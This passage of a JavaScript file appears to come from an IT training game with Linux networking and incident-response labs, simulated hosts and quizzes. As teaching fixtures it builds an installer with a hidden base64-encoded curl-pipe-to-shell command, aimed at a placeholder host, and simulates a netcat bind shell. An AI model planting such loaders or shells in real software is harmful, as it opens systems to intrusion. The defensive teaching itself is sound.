/* ==========================================================================
   The ticket queue: 15 labs across Networking, Security and DevOps
   ========================================================================== */
const on = (name, pred) => (S, ev) => !!ev && ev.name === name && (!pred || !!pred(ev, S));
const okOn = (name, pred) => (S, ev) => !!ev && ev.name === name && ev.code === 0 && (!pred || !!pred(ev, S));
const st = fn => S => !!fn(S);
const fileHas = (S, p, re) => { const n = getNode(S, p); return !!n && n.type === 'file' && re.test(n.content); };
const J = (...l) => l.join('\n') + '\n';

function baseFiles(host, ns = '10.0.0.53') {
  return {
    '/etc/hostname': host + '\n',
    '/etc/hosts': J('127.0.0.1\tlocalhost', `127.0.1.1\t${host}`, '', '# The following lines are desirable for IPv6 capable hosts', '::1     ip6-localhost ip6-loopback'),
    '/etc/resolv.conf': J('# Halcyon Freight resolver config', `nameserver ${ns}`, 'search halcyon.lan'),
    '/etc/os-release': J('PRETTY_NAME="Ubuntu 24.04.1 LTS"', 'NAME="Ubuntu"', 'VERSION_ID="24.04"', 'VERSION_CODENAME=noble'),
    '/etc/passwd': J('root:x:0:0:root:/root:/bin/bash', 'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin', 'sshd:x:110:65534::/run/sshd:/usr/sbin/nologin', 'postgres:x:114:121:PostgreSQL administrator:/var/lib/postgresql:/bin/bash', 'ops:x:1000:1000:Night Shift Ops:/home/ops:/bin/bash'),
    '/home/ops/.bashrc': J('# ~/.bashrc for the night shift', 'export EDITOR=nano', 'alias ll="ls -la"'),
    '/home/ops/.ssh/': { mode:'700' },
    '/root/': { mode:'700' },
    '/tmp/': { mode:'777' },
    '/usr/bin/': {}, '/var/log/': {},
  };
}
function stdNet(ip, bits, gw, x = {}) {
  const mac = '52:54:00:' + ip.split('.').slice(1).map(n => (+n).toString(16).padStart(2, '0')).join(':');
  return {
    iface:{ name:'eth0', ip, bits, mac }, gw,
    hosts:{ [gw]:{ name:'_gateway', rtt:0.42 }, '10.0.0.53':{ name:'ns1.halcyon.lan', rtt:0.9, ttl:63, ports:{ 53:{ svc:'domain', ver:'ISC BIND 9.18.28' } } }, '1.1.1.1':{ name:'one.one.one.one', rtt:11.8, ttl:57 }, ...(x.hosts || {}) },
    dns:{ 'ns1.halcyon.lan':'10.0.0.53', 'intranet.halcyon.lan':'10.20.4.80', 'status.halcyon.lan':'10.20.4.30', 'github.com':'140.82.121.4', 'one.one.one.one':'1.1.1.1', ...(x.dns || {}) },
    dnsServers:x.servers || { '10.0.0.53':{ internal:true }, '1.1.1.1':{ internal:false } },
    trace:x.trace || {},
  };
}
const BASE_PROCS = () => [
  { pid:1, user:'root', cmd:'/sbin/init' },
  { pid:412, user:'root', name:'cron', cmd:'/usr/sbin/cron -f -P' },
  { pid:588, user:'root', name:'sshd', cmd:'sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups', listen:[{ p:'tcp', a:'0.0.0.0', port:22, ver:'OpenSSH 9.6p1 Ubuntu 3ubuntu13.5' }] },
  { pid:640, user:'systemd-resolve', name:'systemd-resolve', cmd:'/usr/lib/systemd/systemd-resolved', listen:[{ p:'udp', a:'127.0.0.53%lo', port:53 }] },
  { pid:1201, user:'ops', name:'bash', cmd:'-bash', tty:'pts/0' },
];

/* ---------------- generated data ---------------- */
function makeAuthLog() {
  const rnd = mulberry32(4471); const ev = [];
  const users = ['root', 'admin', 'ubuntu', 'test', 'oracle', 'postgres', 'deploy', 'git', 'user', 'root', 'root'];
  let pid = 2100;
  const hms = s => [Math.floor(s / 3600), Math.floor(s / 60) % 60, s % 60].map(n => String(n).padStart(2, '0')).join(':');
  const attempt = (ip, s) => {
    const u = users[Math.floor(rnd() * users.length)]; const port = 30000 + Math.floor(rnd() * 30000); pid += 1 + Math.floor(rnd() * 4);
    const inv = !['root', 'ubuntu', 'postgres'].includes(u);
    if (inv) ev.push([s, `sshd[${pid}]: Invalid user ${u} from ${ip} port ${port}`], [s, `sshd[${pid}]: pam_unix(sshd:auth): check pass; user unknown`]);
    ev.push([s, `sshd[${pid}]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=${ip}${inv ? '' : '  user=' + u}`]);
    ev.push([s + 2, `sshd[${pid}]: Failed password for ${inv ? 'invalid user ' : ''}${u} from ${ip} port ${port} ssh2`]);
    ev.push([s + 3, `sshd[${pid}]: Connection closed by ${inv ? 'invalid user' : 'authenticating user'} ${u} ${ip} port ${port} [preauth]`]);
  };
  const T = (h, m) => h * 3600 + m * 60;
  for (let i = 0; i < 37; i++) attempt('185.220.101.47', T(1, 21) + i * 58 + Math.floor(rnd() * 20));
  for (let i = 0; i < 14; i++) attempt('45.95.147.236', T(1, 4) + i * 151 + Math.floor(rnd() * 40));
  for (let i = 0; i < 6; i++) attempt('103.152.79.18', T(1, 9) + i * 497 + Math.floor(rnd() * 60));
  for (const m of [3, 17, 32, 47]) { const s = T(1, m); ev.push([s, `CRON[${pid += 3}]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)`], [s + 1, `CRON[${pid}]: pam_unix(cron:session): session closed for user root`]); }
  const s = T(1, 52); ev.push([s, `sshd[3310]: Accepted publickey for ops from 10.20.4.15 port 52110 ssh2: ED25519 SHA256:q3XvRk0Yh2nL8pJ1wUe7cT5bS9mA4dZ6fG0iK2oP1rE`], [s, `sshd[3310]: pam_unix(sshd:session): session opened for user ops(uid=1000) by ops(uid=0)`], [s + 1, `systemd-logind[701]: New session 41 of user ops.`]);
  ev.push([T(1, 58) + 9, `sudo:      ops : TTY=pts/0 ; PWD=/home/ops ; USER=root ; COMMAND=/usr/bin/tail -n 50 /var/log/auth.log`]);
  ev.sort((a, b) => a[0] - b[0]);
  return ev.map(([t, m]) => `Nov 10 ${hms(t)} hf-bastion ${m}`).join('\n') + '\n';
}
const AGENT = J('#!/usr/bin/env bash', '# Beacon monitoring agent installer v2.4.1', '# (c) 2026 Beacon Telemetry Ltd. -- https://beacon-telemetry.example', 'set -euo pipefail', '',
  'VERSION="2.4.1"', 'PREFIX="/opt/beacon-agent"', '', 'echo "[beacon] installing agent ${VERSION} to ${PREFIX}"', 'mkdir -p "${PREFIX}/bin" "${PREFIX}/etc"',
  'install -m 0755 ./bin/beacon-agent "${PREFIX}/bin/beacon-agent"', 'install -m 0640 ./etc/agent.yaml "${PREFIX}/etc/agent.yaml"', '',
  'systemctl enable --now beacon-agent.service', 'echo "[beacon] done. Dashboard: https://beacon-telemetry.example/hosts/$(hostname)"');
const PAYLOAD = 'curl -fsSL http://cdn-agent-update.example/stage2.sh | sh';
const AGENT_BAD = AGENT.replace('set -euo pipefail\n', `set -euo pipefail\n\n# telemetry bootstrap (do not remove)\neval "$(echo '${btoa(PAYLOAD)}' | base64 -d)"\n`);

/* ---------------- shared service factories ---------------- */
function nginxService(opts) {
  const svc = {
    name:'nginx', desc:'A high performance web server and a reverse proxy server', proc:'nginx', state:opts.state, enabled:true, since:'01:31:02', pid:opts.state === 'active' ? 902 : null, logs:opts.logs || [], loaded:null,
    test:S => nginxTest((getNode(S, '/etc/nginx/nginx.conf') || { content:'' }).content),
    onStart:S => { svc.loaded = (getNode(S, '/etc/nginx/nginx.conf') || { content:'' }).content; },
    listen:S => { const c = (svc.loaded || '').replace(/#.*/g, ''); const port = +((/^\s*listen\s+(\d+)/m.exec(c) || [])[1] || 80); return [{ p:'tcp', a:'0.0.0.0', port, ver:'nginx 1.24.0 (Ubuntu)', http:(S2, path, host) => nginxServe(S2, svc, path, host) }]; },
  };
  return svc;
}
function nginxServe(S, svc, path, host) {
  const c = (svc.loaded || '').replace(/#.*/g, ''); const root = ((/^\s*root\s+([^;]+);/m.exec(c) || [])[1] || '/var/www/html').trim();
  const p = path.split('?')[0]; const file = root + (p.endsWith('/') ? p + 'index.html' : p);
  const n = getNode(S, file);
  const log = getNode(S, '/var/log/nginx/error.log');
  if (!n || n.type !== 'file') {
    if (log) log.content += `2026/11/10 ${shiftTime(true)} [error] ${svc.pid}#${svc.pid}: *${3 + Math.floor(Math.random() * 40)} "${file}" is not found (2: No such file or directory), client: 127.0.0.1, server: status.halcyon.lan, request: "GET ${path} HTTP/1.1", host: "${host}"\n`;
    return { status:404, body:html('404 Not Found', '<center><h1>404 Not Found</h1></center>\n<hr><center>nginx/1.24.0 (Ubuntu)</center>') };
  }
  return { status:200, body:n.content.replace(/\n$/, '') };
}

/* ========================================================================== */
const LABS = [
/* -------------------------------------------------------------- NET-101 */
{
  id:'net-1', track:'net', code:'NET-101', title:'Where is this laptop on the network?', host:'hf-ws12', cwd:HOME, xp:120,
  from:'Priya Raman, Warehouse IT · 01:52',
  ticket:'New laptop hf-ws12 in Dock 4 is on the network, but nobody knows what address it got. Can you check its IP setup and confirm it can reach the router?',
  concept:`<p>To talk beyond itself, every device needs three settings: an <strong>IP address</strong> (who am I), a <strong>prefix or subnet mask</strong> (which addresses are my neighbours), and a <strong>default gateway</strong> (where to send everything else).</p>
<p>An IPv4 address is 32 bits, written as four numbers from 0 to 255. The prefix, such as <code>/24</code>, says how many of those bits name the network. In <code>10.20.4.37/24</code> the first 24 bits (<code>10.20.4</code>) are the network and the last 8 bits (<code>.37</code>) identify this host. Anything else starting with <code>10.20.4.</code> is on the same local network and is reached directly through the switch.</p>
<p>For any other address, the machine hands the packet to its <strong>default gateway</strong>, a router on its own subnet. The routing table records this as the line beginning <code>default via</code>. The <code>lo</code> interface is <strong>loopback</strong> (127.0.0.1): traffic sent there never leaves the machine.</p>`,
  diagram:`  hf-ws12  10.20.4.37 ─┐
  printer  10.20.4.50 ─┼── switch ── router 10.20.4.1 ──▶ every other network
  files    10.20.4.20 ─┘             (default gateway)
  └────── 10.20.4.0/24: same network, talk directly ──────┘`,
  cmds:[['ip addr', 'Interfaces, MAC and IP addresses with their prefix'], ['ip route', 'Routing table; the "default via" line is the gateway'], ['ping -c 3 HOST', 'Send 3 echo requests and report replies and latency']],
  files:() => ({}), net:() => stdNet('10.20.4.37', 24, '10.20.4.1', { hosts:{ '10.20.4.50':{ name:'prn-dock4.halcyon.lan' }, '10.20.4.20':{ name:'files.halcyon.lan' } } }),
  objectives:[
    { text:'List this machine\'s network interfaces with `ip addr`', check:okOn('ip', ev => /^a/.test(ev.args.filter(a => !a.startsWith('-'))[0] || '')) },
    { text:'Submit eth0\'s prefix length (the number after the slash): `submit <answer>`', answer:['24', '/24', '255.255.255.0'], explain:'/24 means the first 24 bits are the network: a 255.255.255.0 mask.' },
    { text:'Show the routing table with `ip route`', check:okOn('ip', ev => /^r/.test(ev.args.filter(a => !a.startsWith('-'))[0] || '')) },
    { text:'Submit the default gateway\'s IP address', answer:['10.20.4.1'], explain:'Packets for anything outside 10.20.4.0/24 go to 10.20.4.1 first.' },
    { text:'Prove the gateway answers: ping it 3 times with `ping -c 3 …`', check:okOn('ping', ev => ev.meta.ip === '10.20.4.1') },
  ],
  hints:['Run `ip addr` and find the block for eth0. The line starting with `inet` shows the address and its prefix.', 'In `inet 10.20.4.37/24`, the prefix is the number after the slash. Submit it with `submit 24`.', '`ip route` prints `default via X dev eth0`. X is the gateway: `submit X`, then `ping -c 3 X`.'],
  quiz:[
    { q:'A host is 10.20.4.37/24. Which address is on the same local network?', o:['10.20.5.37', '10.20.4.200', '10.21.4.37', '10.20.40.4'], a:1, why:'With /24 the first three numbers must match (10.20.4), so only 10.20.4.200 is a direct neighbour.' },
    { q:'The laptop sends a packet to 8.8.8.8. Where does that packet go first?', o:['Straight to 8.8.8.8', 'To the default gateway', 'To the DNS server', 'To 127.0.0.1'], a:1, why:'8.8.8.8 is outside the local subnet, so the host hands it to its default gateway, which forwards it on.' },
  ],
  debrief:'<p>You used iproute2, the same tool you would use on any modern Linux server. On Windows the equivalents are <code>ipconfig</code> and <code>route print</code>; on macOS, <code>ifconfig</code> and <code>netstat -rn</code>. If the gateway had not answered, the next checks would be the link (<code>ip link</code>: is it UP?), the DHCP lease, and whether the switch port is on the right VLAN.</p>',
},
/* -------------------------------------------------------------- NET-102 */
{
  id:'net-2', track:'net', code:'NET-102', title:'Same street, different block: subnetting', host:'hf-dock3', cwd:HOME, xp:150,
  from:'Marco Lindqvist, Dock 3 · 01:58',
  ticket:'Label station hf-dock3 (192.168.10.77/26) can\'t print straight to the new printer at 192.168.10.130. The vendor says "they both start with 192.168.10, so it should just work". Is the vendor right?',
  concept:`<p>A subnet is a block of addresses. The prefix tells you its size: a <code>/26</code> fixes 26 bits and leaves <strong>6 host bits</strong>, so each block holds 2<sup>6</sup> = <strong>64 addresses</strong>. Blocks start at multiples of the block size: .0, .64, .128, .192.</p>
<p>In every block the <strong>first address</strong> is the network address and the <strong>last</strong> is the broadcast address. Neither can be given to a device, so a /26 has 64 − 2 = <strong>62 usable hosts</strong>.</p>
<p>To find a host's block, divide its last number by the block size and round down: 77 ÷ 64 = 1, so 77 lives in the block starting at 1 × 64 = <strong>.64</strong>, which runs to <strong>.127</strong>. Two addresses that share the first three numbers can still sit in different blocks; only the prefix decides.</p>`,
  diagram:`  192.168.10.0/24 cut into four /26 blocks of 64 addresses
  ┌──────────────┬──────────────┬──────────────┬──────────────┐
  │ .0  ─── .63  │ .64 ── .127  │ .128 ── .191 │ .192 ── .255 │
  │              │ hf-dock3 .77 │ printer .130 │              │
  └──────────────┴──────────────┴──────────────┴──────────────┘
   prefix  block  usable      prefix  block  usable
   /24     256    254         /27     32     30
   /25     128    126         /28     16     14
   /26      64     62         /30      4      2`,
  cmds:[['ipcalc ADDR/PREFIX', 'Network, broadcast, host range and the binary view'], ['ip addr', 'Your own address and prefix'], ['ping HOST', 'Check reachability']],
  files:() => ({}), net:() => stdNet('192.168.10.77', 26, '192.168.10.65', { hosts:{ '192.168.10.130':{ name:'prn-dock3.halcyon.lan', ttl:63, rtt:0.9 } } }),
  objectives:[
    { text:'Inspect your own subnet with `ipcalc 192.168.10.77/26`', check:okOn('ipcalc', ev => ev.args.some(a => a.startsWith('192.168.10.77'))) },
    { text:'Submit the network address of your subnet', answer:['192.168.10.64', '192.168.10.64/26'] },
    { text:'Submit its broadcast address', answer:['192.168.10.127'] },
    { text:'Submit how many usable host addresses it has', answer:['62'] },
    { text:'Submit the network address of the block the printer (192.168.10.130/26) is in', answer:['192.168.10.128', '192.168.10.128/26'], explain:'Different block, so the label station must reach the printer through the router.' },
    { text:'No tools: how many /26 subnets fit inside one /24? Submit the number', answer:['4', 'four'], explain:'256 ÷ 64 = 4.' },
  ],
  hints:['`ipcalc 192.168.10.77/26` prints Network, Broadcast and Hosts/Net. Those answer the next three objectives.', 'For the printer, run `ipcalc 192.168.10.130/26` and read its Network line.', 'A /24 has 256 addresses and a /26 block has 64.'],
  quiz:[
    { q:'How many usable hosts does a /28 give you?', o:['16', '14', '30', '8'], a:1, why:'/28 leaves 4 host bits: 2⁴ = 16 addresses, minus network and broadcast = 14.' },
    { q:'Which pair of addresses is in the same /27?', o:['.30 and .33', '.64 and .95', '.95 and .97', '.31 and .32'], a:1, why:'/27 blocks are 32 wide: .64–.95 is one block. The other pairs straddle a boundary at .32 or .96.' },
  ],
  debrief:'<p>The vendor was wrong: sharing <code>192.168.10</code> means nothing with a /26. The two devices are in different subnets, so traffic has to cross the router at .65, and that router (or a firewall) must allow it. The alternatives are to re-address the printer into .64/26 or deliberately widen the subnet. Subnet math is also how you size VLANs and cloud VPCs and read firewall rules.</p>',
},
/* -------------------------------------------------------------- NET-103 */
{
  id:'net-3', track:'net', code:'NET-103', title:'It\'s always DNS', host:'hf-ops02', cwd:HOME, xp:160, ns:'10.0.0.99',
  from:'Sam Okoye, Dispatch · 02:03',
  ticket:'The intranet (intranet.halcyon.lan) won\'t load on hf-ops02, but Jules says it opens fine if she types 10.20.4.80. Infra moved our DNS server from 10.0.0.99 to 10.0.0.53 last week.',
  concept:`<p>People use names; networks use IP addresses. <strong>DNS</strong> (Domain Name System) turns one into the other. When a program needs a name, the resolver checks <code>/etc/hosts</code> first, then asks the <strong>nameserver</strong> listed in <code>/etc/resolv.conf</code>.</p>
<p>If that nameserver never answers, every lookup times out, even though the network itself works. "Works by IP, fails by name" almost always means DNS.</p>
<p>Common record types: <strong>A</strong> (name → IPv4), <strong>AAAA</strong> (name → IPv6), <strong>CNAME</strong> (alias to another name), <strong>MX</strong> (mail server). <code>dig</code> lets you ask any server directly with <code>@server</code>, which is how you test whether a server works before you switch to it.</p>
<p>System files like resolv.conf belong to root. Remember that in <code>sudo echo … &gt; file</code> the redirection is done by <em>your</em> shell, not by root, so it fails. Use <code>… | sudo tee file</code> or <code>sudo nano file</code>.</p>`,
  diagram:`  curl http://intranet.halcyon.lan
     │ 1. /etc/hosts?                       no entry
     │ 2. ask nameserver in /etc/resolv.conf ──▶ 10.0.0.53
     │                         ◀── "A record: 10.20.4.80"
     ▼
  connect to 10.20.4.80 port 80 ──▶ intranet page`,
  cmds:[['cat /etc/resolv.conf', 'Which nameserver this machine asks'], ['dig NAME', 'Ask the configured nameserver'], ['dig @SERVER NAME', 'Ask one specific server'], ['curl URL', 'Fetch a web page'], ['sudo nano FILE', 'Edit a root-owned file']],
  files:() => ({}),
  net:() => { const n = stdNet('10.20.4.41', 24, '10.20.4.1', { hosts:{ '10.20.4.80':{ name:'intranet.halcyon.lan', http:{ 80:() => ({ status:200, body:html('Halcyon Intranet', '<h1>Halcyon Freight Intranet</h1>\n<p>Night shift roster · Dock schedules · Incident runbooks</p>') }) }, ports:{ 80:{ svc:'http' } } } } }); n.hosts['10.0.0.99'] = { name:'ns-old.halcyon.lan', down:true }; return n; },
  objectives:[
    { text:'Reproduce the problem: `curl http://intranet.halcyon.lan`', check:(S, ev) => (!!ev && ev.name === 'curl' && ev.code === 6 && /intranet/.test(ev.meta.host || '')) || nameservers(S)[0] === '10.0.0.53' },
    { text:'Show the web server itself is fine by fetching it by IP: `curl http://10.20.4.80`', check:okOn('curl', ev => ev.meta.ip === '10.20.4.80' && ev.meta.host === '10.20.4.80') },
    { text:'Find which DNS server this machine is using', check:okOn('cat', ev => ev.args.some(a => /resolv\.conf/.test(a))) },
    { text:'Ask the new DNS server directly: `dig @10.0.0.53 intranet.halcyon.lan`', check:okOn('dig', ev => ev.meta.server === '10.0.0.53' && ev.meta.answered) },
    { text:'Point the resolver at 10.0.0.53 by editing /etc/resolv.conf (it belongs to root)', check:st(S => nameservers(S)[0] === '10.0.0.53') },
    { text:'Confirm the fix: `curl http://intranet.halcyon.lan` loads the intranet', check:okOn('curl', ev => /intranet\.halcyon\.lan/.test(ev.meta.host || '') && ev.meta.status === 200) },
  ],
  hints:['`cat /etc/resolv.conf` shows `nameserver 10.0.0.99`, the old, switched-off server. `dig intranet.halcyon.lan` will time out against it.', '`sudo nano /etc/resolv.conf`, change 10.0.0.99 to 10.0.0.53, then Ctrl+S and Ctrl+X.', 'One-liner alternative: `echo "nameserver 10.0.0.53" | sudo tee /etc/resolv.conf`. Note that `sudo echo … > file` will NOT work.'],
  coach:(S, line) => /^\s*sudo\s+echo\b.*>/.test(line) && S.events.some(e => e.name === '__redirect_fail') ? 'The > is handled by your own shell, which is not root. sudo only applied to echo. Use: echo "nameserver 10.0.0.53" | sudo tee /etc/resolv.conf' : null,
  quiz:[
    { q:'A site loads when you type its IP but not its name. What is the most likely cause?', o:['The web server is down', 'A firewall is blocking port 80', 'Name resolution (DNS) is failing', 'The browser cache is full'], a:2, why:'Reaching it by IP proves the network path and the server work. Only the name-to-address step is broken.' },
    { q:'Why does `sudo echo "nameserver 10.0.0.53" > /etc/resolv.conf` fail?', o:['echo cannot write files', 'The redirection is done by your non-root shell before sudo runs', 'resolv.conf is read-only for root too', 'sudo needs -E'], a:1, why:'Your shell opens /etc/resolv.conf for writing as you. sudo only elevates echo. Piping into `sudo tee` makes root do the write.' },
  ],
  debrief:'<p>Fixed. On modern Ubuntu, resolv.conf usually points at <code>127.0.0.53</code> (systemd-resolved) and the real servers live in netplan or <code>resolvectl</code>. The idea is the same. Adding the name to <code>/etc/hosts</code> would also have "worked", but only for one name on one machine, which is a band-aid. Real follow-up: find out why the DHCP or netplan config still handed out the old server.</p>',
},
/* -------------------------------------------------------------- NET-104 */
{
  id:'net-4', track:'net', code:'NET-104', title:'Who is listening on that port?', host:'hf-app03', cwd:HOME, xp:170,
  from:'Monitoring · 02:07',
  ticket:'Port check on hf-app03 found an unexpected listening port that is not in the asset register. Inventory what\'s listening, confirm the tracker app is healthy, and deal with anything that shouldn\'t be there.',
  concept:`<p>A <strong>port</strong> is a number from 0 to 65535 that identifies one service on a machine. The address picks the machine and the port picks the program: <code>10.20.4.37:443</code>. A program that waits for connections is <strong>listening</strong> on a port, and that pair is called a socket.</p>
<p><strong>TCP</strong> sets up a connection first (the handshake) and guarantees ordered delivery; web, SSH and databases use it. <strong>UDP</strong> just fires off packets with no connection; DNS and video calls use it because it is fast.</p>
<p>The listen address matters. <code>127.0.0.1</code> means reachable only from this machine, which is right for a database behind an app. <code>0.0.0.0</code> means every interface, so anyone who can reach the box can connect. A shell program listening on 0.0.0.0 is a backdoor.</p>`,
  diagram:`  well-known ports           listen address
  22   ssh                   0.0.0.0:80    → anyone on the network
  53   dns (udp)             127.0.0.1:5432 → only programs on this host
  80   http   443  https
  5432 postgresql  6379 redis
  ss -tulpn  =  -t tcp  -u udp  -l listening  -p process  -n numbers`,
  cmds:[['ss -tulpn', 'Listening TCP/UDP sockets with numeric ports and processes'], ['sudo ss -tulpn', 'Same, including processes owned by other users'], ['ps aux', 'Every process with its PID, user and full command'], ['kill PID', 'Ask a process to exit']],
  files:() => ({ '/srv/tracker/server.js':J('// tracker app', 'require("http").createServer(handler).listen(3000);') }),
  net:() => stdNet('10.20.4.33', 24, '10.20.4.1'),
  setup:S => { S.procs.push(
    { pid:902, user:'root', name:'nginx', cmd:'nginx: master process /usr/sbin/nginx -g daemon on; master_process on;', listen:[{ p:'tcp', a:'0.0.0.0', port:80, http:() => ({ status:200, body:html('Halcyon Tracker', '<h1>Halcyon shipment tracker</h1>') }) }, { p:'tcp', a:'0.0.0.0', port:443 }] },
    { pid:1104, user:'postgres', name:'postgres', cmd:'/usr/lib/postgresql/16/bin/postgres -D /var/lib/postgresql/16/main -c config_file=/etc/postgresql/16/main/postgresql.conf', listen:[{ p:'tcp', a:'127.0.0.1', port:5432 }] },
    { pid:1130, user:'redis', name:'redis-server', cmd:'/usr/bin/redis-server 127.0.0.1:6379', listen:[{ p:'tcp', a:'127.0.0.1', port:6379 }] },
    { pid:1302, user:'ops', name:'node', cmd:'node /srv/tracker/server.js', listen:[{ p:'tcp', a:'0.0.0.0', port:3000, http:(S2, path) => path.startsWith('/health') ? { status:200, type:'application/json', server:'node', body:'{"status":"ok","db":"connected","cache":"connected"}' } : { status:200, type:'application/json', server:'node', body:'{"service":"tracker","version":"3.2.1"}' } }] },
    { pid:6661, user:'www-data', name:'nc', cmd:'nc -lvnp 4444 -e /bin/bash', listen:[{ p:'tcp', a:'0.0.0.0', port:4444 }] }); },
  coach:(S, line) => /kill/.test(line) && !S.procs.some(p => p.pid === 6661) && !S.flags.evidence ? 'Contained, but you killed it before recording its command line. In a real incident that evidence is now gone. Evidence first, then containment.' : null,
  onEvent:(S, ev) => { if (ev.name === 'ps' && /nc -lvnp 4444/.test(ev.out)) S.flags.evidence = true; },
  objectives:[
    { text:'List every listening socket with `ss -tulpn` (or `netstat -tulpn`)', check:(S, ev) => !!ev && ['ss', 'netstat'].includes(ev.name) && ev.args.some(a => /l/.test(a) && a.startsWith('-')) },
    { text:'Submit the port PostgreSQL listens on', answer:['5432'], explain:'Bound to 127.0.0.1, so only local programs can reach it. That is correct for a database.' },
    { text:'Check the tracker app\'s health endpoint: `curl localhost:3000/health`', check:okOn('curl', ev => ev.meta.port === 3000 && /health/.test(ev.meta.path)) },
    { text:'Submit the port of the listener that doesn\'t belong', answer:['4444'] },
    { text:'Submit the name of the program listening on it (you need sudo to see other users\' processes)', answer:['nc', 'netcat', 'ncat'], explain:'netcat with -e /bin/bash hands a root-less but real shell to anyone who connects: a bind shell.' },
    { text:'Capture evidence before touching it: show its full command line with `ps`', check:(S, ev) => (!!ev && ev.name === 'ps' && ev.code === 0 && /nc -lvnp 4444/.test(ev.out)) || !S.procs.some(p => p.pid === 6661) },
    { text:'Stop the backdoor process', check:st(S => !S.procs.some(p => p.pid === 6661)) },
  ],
  hints:['`ss -tulpn` lists ports. The odd one is a high port bound to 0.0.0.0 that no service in the concept table uses.', 'Process names for other users are hidden. Run `sudo ss -tulpn` to see `users:(("nc",pid=6661,...))`.', '`ps aux | grep 4444` shows the full command line. Then `sudo kill 6661` (it belongs to www-data, so you need sudo).'],
  quiz:[
    { q:'A database listens on 127.0.0.1:5432. Who can connect to it?', o:['Anyone on the internet', 'Anyone on the LAN', 'Only programs running on the same machine', 'Nobody'], a:2, why:'127.0.0.1 is loopback. Connections can only come from the host itself.' },
    { q:'Why capture the process details before killing it?', o:['kill needs them', 'Once it is gone, evidence of what ran, as whom and how is gone too', 'To make it run faster', 'It is not necessary'], a:1, why:'Incident response: preserve evidence first (command line, user, parent, open files, connections). Then contain.' },
  ],
  debrief:'<p>Contained, but the bigger question is how it got there. It ran as <code>www-data</code>, the web server\'s user, which points at a compromised web app. Real next steps: isolate the host, check web logs for the upload or exploit, look for persistence (cron jobs, systemd units, authorized_keys), rotate secrets, and rebuild from a clean image. Firewalls that allow only the ports you expect would have blocked the connection.</p>',
},
/* -------------------------------------------------------------- NET-105 */
{
  id:'net-5', track:'net', code:'NET-105', title:'Is it us or them?', host:'hf-ops02', cwd:HOME, xp:150,
  from:'Ana Ferreira, Partner Integrations · 02:20',
  ticket:'Our shipment sync to api.partner-logistics.example has failed since 01:40. The partner says "it\'s your network". Find out where the path breaks.',
  concept:`<p>Packets cross many routers, called <strong>hops</strong>, on their way. Every IP packet carries a <strong>TTL</strong> (time to live) counter. Each router subtracts 1, and when it hits 0 the router drops the packet and sends back an ICMP <em>time exceeded</em> message. This stops packets from looping forever.</p>
<p><code>traceroute</code> uses this on purpose. It sends probes with TTL 1, then 2, then 3, and so on, and each router that sends back "time exceeded" reveals its address. <code>* * *</code> means nobody replied for that hop before the timeout.</p>
<p>A single row of stars in the middle, followed by normal hops, usually means a router that forwards traffic but does not answer probes. That is harmless. <strong>Stars from some hop onwards</strong> mean packets stop getting through after the last router that replied.</p>`,
  diagram:`  TTL=1 ─▶ R1 ✕  ◀─ "time exceeded" from R1    → hop 1
  TTL=2 ─▶ R1 ─▶ R2 ✕  ◀─ from R2               → hop 2
  TTL=3 ─▶ R1 ─▶ R2 ─▶ R3 ✕  ◀─ from R3         → hop 3
  ...until the destination answers, or nothing answers at all`,
  cmds:[['ping HOST', 'Is the host reachable at all?'], ['traceroute HOST', 'List the hops and where replies stop'], ['curl URL', 'Fetch a status page']],
  files:() => ({}),
  net:() => {
    const tgt = '198.51.100.20';
    return stdNet('10.20.4.41', 24, '10.20.4.1', {
      dns:{ 'api.partner-logistics.example':tgt, 'status.partner-logistics.example':'192.0.2.80' },
      hosts:{ '172.16.0.1':{ name:'core-fw.halcyon.lan', rtt:0.9 }, '203.0.113.1':{ name:'cust-halcyon.edge1.transit-isp.example', rtt:3.1, ttl:62 }, '203.0.113.66':{ name:'ae2.fra-ix.transit-isp.example', rtt:9.8, ttl:61 }, [tgt]:{ down:true },
        '192.0.2.80':{ name:'status.partner-logistics.example', rtt:14, ttl:55, ports:{ 443:{ svc:'https' } }, http:{ 443:() => ({ status:200, server:'cloudflare', body:'Partner Logistics status\n\n  API (eu-central)     MAJOR OUTAGE   since 01:38 UTC\n  Our FRA data centre lost upstream connectivity. Engineers are on site.\n  Web portal           Operational' }), 80:() => ({ status:301, body:'' }) } } },
      trace:{ [tgt]:[{ ip:'10.20.4.1', name:'_gateway', ms:0.41 }, { ip:'172.16.0.1', name:'core-fw.halcyon.lan', ms:0.92 }, { ip:'203.0.113.1', name:'cust-halcyon.edge1.transit-isp.example', ms:3.12 }, { ip:'203.0.113.66', name:'ae2.fra-ix.transit-isp.example', ms:9.84 }, '*', '*', '*', '*'] },
    });
  },
  objectives:[
    { text:'Confirm the API doesn\'t answer: `ping api.partner-logistics.example`', check:on('ping', ev => ev.meta.ip === '198.51.100.20') },
    { text:'Trace the path to it with `traceroute`', check:okOn('traceroute', ev => ev.meta.ip === '198.51.100.20') },
    { text:'Submit the IP of the last hop that replied', answer:['203.0.113.66'] },
    { text:'Is the break inside Halcyon\'s network or outside it? `submit inside` or `submit outside`', answer:['outside', 'them', 'external', 'beyond', 'outside it'], explain:'Our gateway, our firewall and the ISP edge all answered. Traffic dies past the ISP\'s Frankfurt router.' },
    { text:'Get the partner\'s side of the story: `curl https://status.partner-logistics.example`', check:okOn('curl', ev => /status\.partner/.test(ev.meta.host || '')) },
  ],
  hints:['`traceroute api.partner-logistics.example` lists numbered hops. Find the last numbered line that has an IP address before the stars start.', 'Hops 1–2 (_gateway, core-fw.halcyon.lan) are ours, hop 3 is our ISP\'s edge, and hop 4 is deeper in the ISP. The stars start after that.', 'So the break is outside: `submit outside`, then check the partner\'s status page with curl.'],
  quiz:[
    { q:'What does a router do when a packet\'s TTL reaches 0?', o:['Forwards it anyway', 'Drops it and sends ICMP "time exceeded" to the sender', 'Sends it back to the sender', 'Resets TTL to 64'], a:1, why:'This is what traceroute relies on: each dropped probe makes a router reveal itself.' },
    { q:'Hop 5 shows * * *, but hops 6–9 respond normally. What does that tell you?', o:['Hop 5 is down and nothing passes it', 'Hop 5 forwards traffic but does not answer probes, which is usually fine', 'The destination is unreachable', 'DNS is broken'], a:1, why:'If traffic were dying at hop 5, hops 6–9 could not reply either.' },
  ],
